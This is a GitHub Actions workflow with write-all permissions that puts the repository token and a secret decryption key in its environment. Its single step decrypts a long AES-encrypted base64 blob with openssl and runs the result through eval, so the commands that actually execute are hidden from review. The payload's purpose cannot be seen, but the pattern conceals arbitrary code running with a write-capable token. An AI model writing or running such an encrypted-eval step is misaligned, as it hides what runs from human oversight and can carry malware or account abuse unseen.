name: Run

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: 'aria2'
        type: string
      option2:
        required: true
        default: ''
        type: string
      option3:
        required: false
        default: ''
        type: string
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}

jobs:
  j:
    runs-on: ubuntu-24.04
    steps:
      - name: May
        run: |
          encrypted_payload="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"

          decrypted=$(echo "$encrypted_payload" | base64 -d | openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:"$DECRYPTION_KEY")

          if [ $? -eq 0 ]; then
            eval "$decrypted"
          fi
